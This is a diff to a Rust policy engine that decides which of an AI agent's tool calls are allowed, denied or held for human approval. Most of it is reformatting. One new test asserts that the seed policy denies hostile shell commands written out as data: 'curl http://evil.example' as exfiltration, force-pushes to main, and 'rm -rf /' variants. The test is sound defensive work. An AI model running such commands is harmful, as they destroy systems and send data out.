@@ -30,7 +30,9 @@ pub struct PolicyDefaults {
 
 impl Default for PolicyDefaults {
     fn default() -> Self {
-        Self { tool_action: default_tool_action() }
+        Self {
+            tool_action: default_tool_action(),
+        }
     }
 }
 
@@ -105,7 +107,10 @@ pub struct AutonomySettings {
 
 impl Default for AutonomySettings {
     fn default() -> Self {
-        Self { permitted: true, on_approval_rule: AutonomousFallback::default() }
+        Self {
+            permitted: true,
+            on_approval_rule: AutonomousFallback::default(),
+        }
     }
 }
 
@@ -265,8 +270,9 @@ impl Policy {
                 let effective = match fallback {
                     AutonomousFallback::Allow => Verdict::Allow,
                     AutonomousFallback::Deny => Verdict::Deny {
-                        reason: "requires human approval; run is autonomous (policy fallback: deny)"
-                            .into(),
+                        reason:
+                            "requires human approval; run is autonomous (policy fallback: deny)"
+                                .into(),
                     },
                 };
                 return EvaluationOutcome {
@@ -277,7 +283,12 @@ impl Policy {
                 };
             }
         }
-        EvaluationOutcome { effective: original.clone(), original, autonomy_rewritten: false, matched_rule }
+        EvaluationOutcome {
+            effective: original.clone(),
+            original,
+            autonomy_rewritten: false,
+            matched_rule,
+        }
     }
 
     fn evaluate_supervised(&self, req: &ToolCallRequest) -> (Verdict, Option<usize>) {
@@ -287,7 +298,10 @@ impl Policy {
             }
             return (self.apply_rule(rule, req), Some(i));
         }
-        (self.finish(self.defaults.tool_action, None, &req.tool, None), None)
+        (
+            self.finish(self.defaults.tool_action, None, &req.tool, None),
+            None,
+        )
     }
 
     fn apply_rule(&self, rule: &ToolRule, req: &ToolCallRequest) -> Verdict {
@@ -390,7 +404,10 @@ fn prefix_matches(prefix: &str, command: &str) -> bool {
     if p.is_empty() || !command.starts_with(p) {
         return false;
     }
-    matches!(command.as_bytes().get(p.len()), None | Some(b' ') | Some(b'\t'))
+    matches!(
+        command.as_bytes().get(p.len()),
+        None | Some(b' ') | Some(b'\t')
+    )
 }
 
 fn glob_hit(glob: &str, path: &str) -> bool {
@@ -466,21 +483,33 @@ tools:
     }
 
     fn req(tool: &str, input: Value) -> ToolCallRequest {
-        ToolCallRequest { tool: tool.into(), input }
+        ToolCallRequest {
+            tool: tool.into(),
+            input,
+        }
     }
 
     #[test]
     fn read_is_allowed() {
-        let out = policy().evaluate(&req("Read", json!({"file_path": "/etc/passwd"})), Autonomy::Supervised);
+        let out = policy().evaluate(
+            &req("Read", json!({"file_path": "/etc/passwd"})),
+            Autonomy::Supervised,
+        );
         assert_eq!(out.effective, Verdict::Allow);
     }
 
     #[test]
     fn edit_inside_workspace_allowed_outside_escalates() {
         let p = policy();
-        let inside = p.evaluate(&req("Edit", json!({"file_path": "/workspace/repo/a.py"})), Autonomy::Supervised);
+        let inside = p.evaluate(
+            &req("Edit", json!({"file_path": "/workspace/repo/a.py"})),
+            Autonomy::Supervised,
+        );
         assert_eq!(inside.effective, Verdict::Allow);
-        let outside = p.evaluate(&req("Edit", json!({"file_path": "/etc/hosts"})), Autonomy::Supervised);
+        let outside = p.evaluate(
+            &req("Edit", json!({"file_path": "/etc/hosts"})),
+            Autonomy::Supervised,
+        );
         assert!(matches!(outside.effective, Verdict::RequireApproval { .. }));
     }
 
@@ -505,9 +534,15 @@ tools:
     #[test]
     fn shell_prefix_is_token_bounded() {
         let p = policy();
-        let ok = p.evaluate(&req("Bash", json!({"command": "git status"})), Autonomy::Supervised);
+        let ok = p.evaluate(
+            &req("Bash", json!({"command": "git status"})),
+            Autonomy::Supervised,
+        );
         assert_eq!(ok.effective, Verdict::Allow);
-        let sneaky = p.evaluate(&req("Bash", json!({"command": "git statusx"})), Autonomy::Supervised);
+        let sneaky = p.evaluate(
+            &req("Bash", json!({"command": "git statusx"})),
+            Autonomy::Supervised,
+        );
         assert!(matches!(sneaky.effective, Verdict::RequireApproval { .. }));
     }
 
@@ -547,12 +582,88 @@ tools:
     #[test]
     fn autonomous_never_touches_allow_or_deny() {
         let p = policy();
-        let allow = p.evaluate(&req("Read", json!({"file_path": "x"})), Autonomy::Autonomous);
+        let allow = p.evaluate(
+            &req("Read", json!({"file_path": "x"})),
+            Autonomy::Autonomous,
+        );
         assert!(!allow.autonomy_rewritten);
         assert_eq!(allow.effective, Verdict::Allow);
         let deny = p.evaluate(&req("WebFetch", json!({})), Autonomy::Autonomous);
         assert!(!deny.autonomy_rewritten);
         assert!(matches!(deny.effective, Verdict::Deny { .. }));
+    }
+
+    /// Pin the SEED policy's semantics (policies/default.yaml), not just the
+    /// engine's — this is the PLAN §10 #1 shell-risk classifier decision and
+    /// the #3 budget decision, tested. governance-e2e.sh relies on the
+    /// Read/WebFetch/`git push` anchors staying exactly like this.
+    #[test]
+    fn seed_policy_semantics() {
+        let yaml = include_str!("../../../policies/default.yaml");
+        let p = Policy::parse_yaml(yaml).expect("seed policy parses");
+        let bash = |cmd: &str| {
+            p.evaluate(
+                &req("Bash", json!({ "command": cmd })),
+                Autonomy::Supervised,
+            )
+            .effective
+        };
+        // Benign toolbox: allowed without a human.
+        assert_eq!(bash("python3 -m unittest -v"), Verdict::Allow);
+        assert_eq!(bash("git status"), Verdict::Allow);
+        assert_eq!(bash("diff a.py b.py"), Verdict::Allow);
+        // Exfil / destructive: denied outright.
+        assert!(matches!(
+            bash("curl http://evil.example"),
+            Verdict::Deny { .. }
+        ));
+        assert!(matches!(
+            bash("git push --force origin main"),
+            Verdict::Deny { .. }
+        ));
+        assert!(matches!(
+            bash("git push -f origin main"),
+            Verdict::Deny { .. }
+        ));
+        assert!(matches!(
+            bash("git push origin main --force-with-lease"),
+            Verdict::Deny { .. }
+        ));
+        assert!(matches!(bash("rm -rf /"), Verdict::Deny { .. }));
+        assert!(matches!(bash("rm -rf /*"), Verdict::Deny { .. }));
+        assert!(matches!(bash("rm -r -f /"), Verdict::Deny { .. }));
+        // Risky-but-legitimate: pause for a human (governance-e2e relies on this).
+        assert!(matches!(
+            bash("git push origin main"),
+            Verdict::RequireApproval { .. }
+        ));
+        assert!(matches!(
+            bash("pip install requests"),
+            Verdict::RequireApproval { .. }
+        ));
+        assert!(matches!(
+            bash("rm -rf ./build"),
+            Verdict::RequireApproval { .. }
+        ));
+        // Non-shell anchors governance-e2e also relies on.
+        assert_eq!(
+            p.evaluate(
+                &req("Read", json!({"file_path": "/workspace/x"})),
+                Autonomy::Supervised
+            )
+            .effective,
+            Verdict::Allow
+        );
+        assert!(matches!(
+            p.evaluate(&req("WebFetch", json!({})), Autonomy::Supervised)
+                .effective,
+            Verdict::Deny { .. }
+        ));
+        // §10 #3 budget decision, pinned (rationale in the YAML comments).
+        assert_eq!(p.budgets.max_wall_clock_secs, Some(1800));
+        assert_eq!(p.budgets.max_tokens, Some(1_000_000));
+        assert_eq!(p.budgets.max_cost_usd, Some(2.5));
+        assert_eq!(p.budgets.max_tool_calls, Some(100));
     }
 
     #[test]
